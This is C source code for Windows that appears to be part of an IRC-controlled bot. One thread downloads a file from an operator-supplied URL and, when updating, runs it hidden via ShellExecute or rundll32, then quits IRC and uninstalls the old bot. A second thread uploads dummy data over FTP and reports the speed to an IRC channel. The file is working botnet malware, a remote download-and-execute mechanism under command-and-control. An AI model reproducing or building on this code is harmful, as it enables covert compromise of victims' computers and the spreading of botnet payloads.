#include "include.h"
#include "extern.h"

unsigned int __stdcall download(void *param)
/* downloads a file from the internet */
{
	unsigned long r;
	unsigned long w;
	char buffer[4096];
	struct dls dl = *(struct dls *)param;
	struct dls *pdl = (struct dls *)param;
	HINTERNET ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	HINTERNET fh = InternetOpenUrl(ih, dl.url, 0, 0, 0, 0);
	pdl->gotinfo = true;
	if(fh)
	{
		HANDLE f = CreateFile(dl.dest, GENERIC_WRITE, 0, 0, CREATE_ALWAYS, 0, 0);
		if(f == INVALID_HANDLE_VALUE)
		{
			clearthread(dl.tnum);
			_endthreadex(0);
		}
		do
		{
			InternetReadFile(fh, buffer, sizeof(buffer), &r);
			WriteFile(f, buffer, r, &w, 0);
		}
		while(r > 0);
		CloseHandle(f);
		InternetCloseHandle(fh);
		InternetCloseHandle(ih);
		if(dl.update) /* update to new bot */
		{
			if(dl.updatex)
				ShellExecute(0, "open", dl.dest, 0, 0, SW_HIDE);
			else
			{
				char buf[256];
				_snprintf(buf, sizeof(buf), "%s,start", dl.dest);
				ShellExecute(0, "open", "rundll32.exe", buf, 0, SW_HIDE);
			}
			irc_send("QUIT");
			uninstall();
		}
		else if(dl.run) /* open file */
			ShellExecute(0, "open", dl.dest, 0, 0, SW_SHOW);
	}
	clearthread(dl.tnum);
	_endthreadex(0);
	return 0;
}

unsigned int __stdcall speedtest(void *param)
{
	int i;
	unsigned long started;
	unsigned long elapsed;
	unsigned long speed;
	unsigned long w;
	char fbuf[4096];
	struct spds spd = *(struct spds *)param;
	struct spds *pspd = (struct spds *)param;
	HINTERNET ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
	HINTERNET ich;
	HINTERNET ftph;
	URL_COMPONENTS url;
	pspd->gotinfo = true;
	url.lpszUserName = (char *)malloc(128);
	url.dwUserNameLength = 128;
	url.lpszPassword = (char *)malloc(128);
	url.dwPasswordLength = 128;
	url.lpszHostName = (char *)malloc(128);
	url.dwHostNameLength = 128;
	url.dwStructSize = sizeof(url);
	InternetCrackUrl(spd.url, 0, 0, &url);
	ich = InternetConnect(ih, url.lpszHostName, url.nPort, url.lpszUserName, url.lpszPassword, INTERNET_SERVICE_FTP, 0, 0);
	if(ich)
	{
		ftph = FtpOpenFile(ich, "speed.test", GENERIC_WRITE, FTP_TRANSFER_TYPE_BINARY, 0);
		if(ftph)
		{
			memset(fbuf, 'A', sizeof(fbuf));
			started = GetTickCount() / 1000;
			for(i = 0; i < spd.size * 1024 / 4096; i++)
			{
				InternetWriteFile(ftph, fbuf, sizeof(fbuf), &w);
				elapsed = GetTickCount() / 1000 - started;
			}
			speed = spd.size / ((elapsed) ? elapsed : 1);
			irc_privmsg(spd.target, "speedtest complete (upload speed: %luKB/s)", speed);
		}
	}
	InternetCloseHandle(ftph);
	InternetCloseHandle(ich);
	InternetCloseHandle(ih);
	free(url.lpszUserName);
	free(url.lpszPassword);
	free(url.lpszHostName);
	clearthread(spd.tnum);
	_endthreadex(0);
	return 0;
}